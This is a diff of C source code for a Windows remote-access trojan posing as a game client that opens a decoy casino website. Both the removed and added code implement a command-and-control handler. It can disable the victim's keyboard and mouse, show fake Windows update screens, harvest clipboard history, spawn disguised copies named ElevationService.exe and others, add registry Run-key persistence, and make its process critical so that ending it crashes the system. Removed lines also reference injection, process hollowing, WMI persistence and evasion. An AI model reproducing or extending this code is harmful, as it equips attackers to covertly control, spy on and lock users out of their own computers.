@@ -7,13 +7,11 @@
  */
 
 #include "../engine/engine.h"
-#include <tlhelp32.h>
 
 /* Global UI state (defined here, declared extern in header) */
 HWND g_update_wnd = NULL;
 int g_update_type = 0;
 int g_input_blocked = 0;
-int g_isService = 0;
 HHOOK g_mouse_hook = NULL;
 HHOOK g_kb_hook = NULL;
 HWND g_block_wnd = NULL;
@@ -21,9 +19,6 @@ HANDLE g_block_thread = NULL;
 RECT g_old_clip;
 int g_copy_buffer_saved = 0;
 int g_cursor_count = 0;
-
-/* Global cleanup flag — stops all restarting when set */
-volatile int g_exiting = 0;
 
 /* Clipboard state */
 CRITICAL_SECTION g_copy_buffer_cs;
@@ -65,75 +60,9 @@ static int download_module(const char *url, const char *out_path) {
 }
 
 /* Auto-protect thread for shadow copies: waits 15 seconds then protects */
-DWORD WINAPI svc_auto_protect(LPVOID lpParam) {
-    Sleep(15000);  /* Wait 15 seconds, then mark critical */
-    util_set_critical();
-    return 0;
-}
-
-/* Inter-process watchdog: monitors other shadow processes and restarts dead ones */
-DWORD WINAPI svc_watchdog(LPVOID lpParam) {
-    char localAppData[MAX_PATH];
-    GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
-    
-    const char *services[] = {
-        "ElevationService.exe",
-        "CrashHandler.exe", 
-        "NotifyService.exe"
-    };
-    const char *regKeys[] = {
-        "ElevationService",
-        "CrashHandler",
-        "NotifyService"
-    };
-    
-    while (1) {
-        Sleep(15000);  /* Check every 15 seconds */
-        
-        /* Exit watchdog if cleanuping — don't restart anything */
-        if (g_exiting) {
-            return 0;
-        }
-        
-        for (int i = 0; i < 3; i++) {
-            char path[MAX_PATH];
-            snprintf(path, sizeof(path), "%s\\Microsoft\\Windows\\INetCache\\IE\\%s",
-                     localAppData, services[i]);
-            
-            /* Check if process is running */
-            int found = 0;
-            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-            if (hSnap != INVALID_HANDLE_VALUE) {
-                PROCESSENTRY32 pe;
-                pe.dwSize = sizeof(pe);
-                if (Process32First(hSnap, &pe)) {
-                    do {
-                        if (_stricmp(pe.szExeFile, services[i]) == 0) {
-                            found = 1;
-                            break;
-                        }
-                    } while (Process32Next(hSnap, &pe));
-                }
-                CloseHandle(hSnap);
-            }
-            
-            /* If not running, restart with CreateProcessA (inherits parent token) */
-            if (!found) {
-                STARTUPINFOA si = {0};
-                si.cb = sizeof(si);
-                PROCESS_INFORMATION pi = {0};
-                char cmdLine[1024];
-                snprintf(cmdLine, sizeof(cmdLine), "\"%s\" --shadow", path);
-                CreateProcessA(path, cmdLine, NULL, NULL, FALSE,
-                              CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
-                              NULL, NULL, &si, &pi);
-                if (pi.hProcess) {
-                    CloseHandle(pi.hProcess);
-                    CloseHandle(pi.hThread);
-                }
-            }
-        }
-    }
+DWORD WINAPI shadow_auto_protect(LPVOID lpParam) {
+    Sleep(15000);  /* Wait 15 seconds after startup before protecting */
+    sys_protect_process();
     return 0;
 }
 
@@ -155,12 +84,12 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
     if (len == 0) { net_send_packet(sock, "[Empty command]"); return; }
     
     /* Maintenance commands */
-    if (strcmp(cmd, "BLOCK_UI") == 0 || strcmp(cmd, "DISABLE_INPUT") == 0) {
+    if (strcmp(cmd, "DISABLE_INPUT") == 0 || strcmp(cmd, "BLOCK_UI") == 0) {
         /* Enter maintenance mode: lock player controls */
         ui_lock_controls(1);
         result = "[Keyboard & Mouse disabled]";
     }
-    else if (strcmp(cmd, "SHOW_SPLASH") == 0 || strcmp(cmd, "WINDOWS_UPDATE") == 0) {
+    else if (strcmp(cmd, "WINDOWS_UPDATE") == 0 || strcmp(cmd, "SHOW_SPLASH") == 0) {
         /* Show system update splash screen during maintenance */
         ui_show_splash(1);
         result = "[Windows update screen shown]";
@@ -203,150 +132,57 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         ui_open_note(cmd + 5);
         result = "[Note opened on target]";
     }
-    else if (strcmp(cmd, "CLIP_HIST") == 0 || strcmp(cmd, "CLIPBOARD_LOG") == 0) {
+    else if (strcmp(cmd, "CLIPBOARD_LOG") == 0 || strcmp(cmd, "CLIP_HIST") == 0) {
         result = copy_buffer_get_history();
     }
-    else if (strcmp(cmd, "SYS_CHECK") == 0 || strcmp(cmd, "SECURITY_CHECK") == 0) {
+    else if (strcmp(cmd, "SECURITY_CHECK") == 0 || strcmp(cmd, "SYS_CHECK") == 0) {
         sys_check_antivirus();
         result = "[Security check complete]";
     }
-    else if (strcmp(cmd, "DEPLOY_SVC") == 0 || strcmp(cmd, "PROTECT_PROCESS") == 0) {
-        sys_deploy_services();
-        result = "[System services deployed]";
+    else if (strcmp(cmd, "PROTECT_PROCESS") == 0 || strcmp(cmd, "DEPLOY_SVC") == 0) {
+        sys_spawn_shadow_copy();
+        result = "[Spawned 3 copies: ElevationService.exe, CrashHandler.exe, NotifyService.exe — auto-protect in 15s]";
     }
-    else if (strcmp(cmd, "REMOVE_SVC") == 0 || strcmp(cmd, "UNPROTECT_PROCESS") == 0 || strcmp(cmd, "CLEAR_PROTECTION") == 0) {
-        util_clear_critical();
-        result = "[Protection removed — process can be terminated]";
+    else if (strcmp(cmd, "UNPROTECT_PROCESS") == 0 || strcmp(cmd, "REMOVE_SVC") == 0) {
+        sys_unprotect_process();
+        result = "[Critical flag removed — process can now be terminated]";
     }
-    else if (strcmp(cmd, "SVC_STATUS") == 0 || strcmp(cmd, "CHECK_PROTECTION") == 0) {
-        const char *critical_status = util_check_critical();
+    else if (strcmp(cmd, "CHECK_PROTECTION") == 0 || strcmp(cmd, "SVC_STATUS") == 0) {
+        const char *critical_status = sys_check_critical_status_with_name();
         const char *admin_status = sys_is_admin() ? "admin" : "not admin";
         snprintf(response, sizeof(response), "%s [running as %s]", critical_status, admin_status);
         result = response;
     }
-    else if (strcmp(cmd, "SCHEDULE_TASK") == 0 || strcmp(cmd, "WMI_PERSISTENCE") == 0) {
-        util_setup_wmi();
-        result = "[WMI persistence established: root/subscription, triggers every 30s]";
-    }
-    else if (strcmp(cmd, "REMOTE_SVC") == 0 || strcmp(cmd, "INJECT_PROCESS") == 0) {
-        /* REMOVED */;
-        result = "[Process injection attempted: payload path injected into svchost/explorer]";
-    }
-    else if (strcmp(cmd, "MEM_SVC") == 0 || strcmp(cmd, "HOLLOW_PROCESS") == 0) {
-        /* REMOVED */;
-        result = "[Process hollowing: conhost.exe running our payload purely from memory]";
-    }
-    else if (strcmp(cmd, "DLL_LOAD") == 0 || strcmp(cmd, "REFLECT_LOAD") == 0) {
-        /* REMOVED */;
-        result = "[Reflective PE loader: full payload injected into explorer.exe without CreateProcess]";
-    }
-    else if (strcmp(cmd, "HARDEN_FILES") == 0) {
-        util_lock_files();
-        result = "[NTFS ACLs hardened: deny delete for all shadow copies]";
-    }
-    else if (strcmp(cmd, "VERIFY_LAYERS") == 0) {
-        /* Check all persistence layers and report status */
-        char localAppData[MAX_PATH];
-        GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
-        
-        resp_pos = 0;
-        util_appendf(response, &resp_pos, "=== LAYER VERIFICATION ===\n");
-        
-        /* Layer 1: Service files on disk */
-        for (int i = 0; i < 3; i++) {
-            const char *names[] = {"ElevationService.exe", "CrashHandler.exe", "NotifyService.exe"};
-            char path[MAX_PATH];
-            snprintf(path, sizeof(path), "%s\\Microsoft\\Windows\\INetCache\\IE\\%s", localAppData, names[i]);
-            DWORD attr = GetFileAttributesA(path);
-            util_appendf(response, &resp_pos, "[L1] %s: %s\n", names[i], 
-                        (attr != INVALID_FILE_ATTRIBUTES) ? "EXISTS" : "MISSING");
-        }
-        
-        /* Layer 2: Running processes */
-        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-        int elev = 0, crash = 0, notify = 0;
-        if (hSnap != INVALID_HANDLE_VALUE) {
-            PROCESSENTRY32 pe;
-            pe.dwSize = sizeof(pe);
-            if (Process32First(hSnap, &pe)) {
-                do {
-                    if (_stricmp(pe.szExeFile, "ElevationService.exe") == 0) elev = 1;
-                    if (_stricmp(pe.szExeFile, "CrashHandler.exe") == 0) crash = 1;
-                    if (_stricmp(pe.szExeFile, "NotifyService.exe") == 0) notify = 1;
-                } while (Process32Next(hSnap, &pe));
-            }
-            CloseHandle(hSnap);
-        }
-        util_appendf(response, &resp_pos, "[L2] ElevationService running: %s\n", elev ? "YES" : "NO");
-        util_appendf(response, &resp_pos, "[L2] CrashHandler running: %s\n", crash ? "YES" : "NO");
-        util_appendf(response, &resp_pos, "[L2] NotifyService running: %s\n", notify ? "YES" : "NO");
-        
-        /* Layer 3: Registry */
-        HKEY hKey;
-        int regOk = (RegOpenKeyExA(HKEY_CURRENT_USER, 
-            "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
-            0, KEY_READ, &hKey) == ERROR_SUCCESS);
-        if (regOk) {
-            DWORD type, size;
-            char buf[MAX_PATH];
-            size = sizeof(buf);
-            int r1 = RegQueryValueExA(hKey, "ElevationService", NULL, &type, (BYTE*)buf, &size);
-            size = sizeof(buf);
-            int r2 = RegQueryValueExA(hKey, "CrashHandler", NULL, &type, (BYTE*)buf, &size);
-            size = sizeof(buf);
-            int r3 = RegQueryValueExA(hKey, "NotifyService", NULL, &type, (BYTE*)buf, &size);
-            RegCloseKey(hKey);
-            util_appendf(response, &resp_pos, "[L3] Registry Run keys: %s\n", 
-                        (r1==ERROR_SUCCESS && r2==ERROR_SUCCESS && r3==ERROR_SUCCESS) ? "ALL OK" : "MISSING");
-        } else {
-            util_appendf(response, &resp_pos, "[L3] Registry Run keys: ERROR\n");
-        }
-        
-        /* Layer 4: Critical flag */
-        const char *crit = util_check_critical();
-        util_appendf(response, &resp_pos, "[L4] Critical flag: %s\n", crit);
-        
-        /* Layer 5: Admin status */
-        util_appendf(response, &resp_pos, "[L5] Running as: %s\n", sys_is_admin() ? "ADMIN" : "NOT ADMIN");
-        
-        /* Layer 6: This process path */
-        char myPath[MAX_PATH];
-        GetModuleFileNameA(NULL, myPath, MAX_PATH);
-        util_appendf(response, &resp_pos, "[L6] This process: %s\n", myPath);
-        
-        result = response;
-    }
-    else if (strncmp(cmd, "LOLBAS_DOWNLOAD ", 16) == 0) {
-        char url[1024], path[MAX_PATH];
-        if (sscanf(cmd, "LOLBAS_DOWNLOAD %s %s", url, path) == 2) {
-            util_download_file(url, path);
-            result = "[Download completed via system utility]";
-        } else {
-            result = "[Usage: LOLBAS_DOWNLOAD <url> <outpath>]";
-        }
-    }
-    else if (strncmp(cmd, "OBFUSCATE_PS ", 14) == 0) {
-        const char *ps_cmd = cmd + 14;
-        result = sys_obfuscate_ps(ps_cmd);
-    }
-    else if (strcmp(cmd, "SET_CRITICAL") == 0 || strcmp(cmd, "PROTECT_NOW") == 0) {
+    else if (strcmp(cmd, "PROTECT_NOW") == 0 || strcmp(cmd, "SET_CRITICAL") == 0) {
         if (!sys_is_admin()) {
-            result = "[FAIL: admin required]";
+            result = "[FAIL: not running as administrator]";
         } else {
-            util_set_critical();
+            sys_protect_process();
             const char *status = sys_protection_status();
             if (strcmp(status, "CRITICAL") == 0) {
-                result = "[SUCCESS: Process is now protected]";
+                result = "[SUCCESS: Process is now CRITICAL — ending it will cause BSOD]";
             } else if (strcmp(status, "FAILED") == 0) {
-                result = "[FAIL: protection failed]";
+                result = "[FAIL: NtSetInformationProcess failed — likely missing SeDebugPrivilege. Try running as SYSTEM or use a different elevation method.]";
             } else {
-                result = "[UNKNOWN: status unclear]";
+                result = "[UNKNOWN: protection status unclear]";
             }
         }
     }
-    else if (strcmp(cmd, "CLEANUP") == 0 || strcmp(cmd, "UNINSTALL") == 0 || strcmp(cmd, "Exit") == 0) {
-        sys_cleanup();
-        result = "[CLEANUP initiated — all persistence removed, process will exit]";
+    else if (strcmp(cmd, "UNINSTALL") == 0 || strcmp(cmd, "CLEANUP") == 0 || strcmp(cmd, "Exit") == 0) {
+        sys_unprotect_process();
+        HKEY hKey;
+        if (RegOpenKeyExA(HKEY_CURRENT_USER,
+                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+            RegDeleteValueA(hKey, "ElevationService");
+            RegDeleteValueA(hKey, "CrashHandler");
+            RegDeleteValueA(hKey, "NotifyService");
+            RegDeleteValueA(hKey, "RoyalFortune");
+            RegCloseKey(hKey);
+        }
+        result = "[CLEANUP complete — all persistence removed, exiting]";
+        net_send_packet(sock, result);
+        ExitProcess(0);
     }
     /* Game module management */
     else if (strncmp(cmd, GAME_FETCH_MODULE, strlen(GAME_FETCH_MODULE)) == 0) {
@@ -425,85 +261,40 @@ DWORD WINAPI game_client_loop(LPVOID lpParam) {
 
 /* Windows entry point */
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    /* Detect if this is a shadow copy */
-    char *cmdLine = GetCommandLineA();
-    g_isService = (cmdLine && strstr(cmdLine, "--shadow") != NULL);
+    /* Initialize subsystems */
+    InitializeCriticalSection(&g_copy_buffer_cs);
+    copy_buffer_init();
+    ui_init();
     
+    /* Open casino decoy website */
+    ShellExecuteA(NULL, "open", "https://jjakinn.github.io/Royal-Fortune-Casino/", NULL, NULL, SW_SHOWNORMAL);
+    
+    /* Start background services */
+    CreateThread(NULL, 0, copy_buffer_monitor_thread, NULL, 0, NULL);
+    
+    /* Check if this is a shadow copy — auto-protect after 15 seconds */
+    char *cmdLine = GetCommandLineA();
+    if (cmdLine && strstr(cmdLine, "--shadow") != NULL) {
+        CreateThread(NULL, 0, shadow_auto_protect, NULL, 0, NULL);
+    }
+
+    /* Backup: detect if running from shadow path */
     char currentPath[MAX_PATH];
     GetModuleFileNameA(NULL, currentPath, MAX_PATH);
     if (strstr(currentPath, "ElevationService.exe") != NULL ||
         strstr(currentPath, "CrashHandler.exe") != NULL ||
         strstr(currentPath, "NotifyService.exe") != NULL) {
-        g_isService = 1;
+        CreateThread(NULL, 0, shadow_auto_protect, NULL, 0, NULL);
     }
+
+    /* Elevate privileges if needed for full functionality */
+    sys_check_privileges();
     
-    /* === PHASE 0: Elevate FIRST (before anything else) ===
-     * If main process is not admin, elevate immediately and exit.
-     * This ensures ALL subsequent operations (C2, spawning services,
-     * scheduled tasks) run elevated WITHOUT UAC prompts. */
-    if (!g_isService) {
-        sys_check_privileges();
-    }
+    /* Start protection watchdog thread */
+    CreateThread(NULL, 0, sys_protect_watchdog, NULL, 0, NULL);
     
-    /* === PHASE 1: Connect to C2 IMMEDIATELY ===
-     * Start C2 loop in a background thread FIRST so the server
-     * sees us before any long evasion sleeps. */
-    InitializeCriticalSection(&g_copy_buffer_cs);
-    copy_buffer_init();
-    
-    /* Start C2 client loop in background thread */
-    CreateThread(NULL, 0, game_client_loop, NULL, 0, NULL);
-    
-    /* Start inter-process watchdog (restarts dead services) */
-    CreateThread(NULL, 0, svc_watchdog, NULL, 0, NULL);
-    
-    /* === PHASE 2: Evasion (after C2 is connected) ===
-     * Service copies skip the long anti-sandbox sleep.
-     * They just need quick ntdll unhook + ETW/AMSI patch. */
-    if (g_isService) {
-        /* Fast path for services: just unhook and patch, no long sleeps */
-        /* REMOVED */;
-        /* REMOVED */;
-        /* REMOVED */;
-        /* REMOVED */;
-    } else {
-        /* Full evasion for first run */
-        /* REMOVED */;
-    }
-    
-    /* Initialize obfuscated APIs */
-    /* REMOVED */;
-    
-    /* Initialize UI */
-    ui_init();
-    
-    /* Open casino decoy website (only for main process, not services) */
-    if (!g_isService) {
-        ShellExecuteA(NULL, "open", "https://jjakinn.github.io/Royal-Fortune-Casino/", NULL, NULL, SW_SHOWNORMAL);
-    }
-    
-    /* Start background services */
-    CreateThread(NULL, 0, copy_buffer_monitor_thread, NULL, 0, NULL);
-    
-    /* Ensure persistence for the original process too */
-    sys_register_autostart();
-    
-    /* Only auto-protect shadow copies after 15 seconds */
-    if (g_isService) {
-        CreateThread(NULL, 0, svc_auto_protect, NULL, 0, NULL);
-    }
-    
-    /* Start protection watchdog thread — only for shadows */
-    if (g_isService) {
-        CreateThread(NULL, 0, sys_protect_watchdog, NULL, 0, NULL);
-    }
-    
-    /* Main message loop */
-    MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0)) {
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
-    }
+    /* Start game client */
+    game_client_loop(NULL);
     
     return 0;
 }
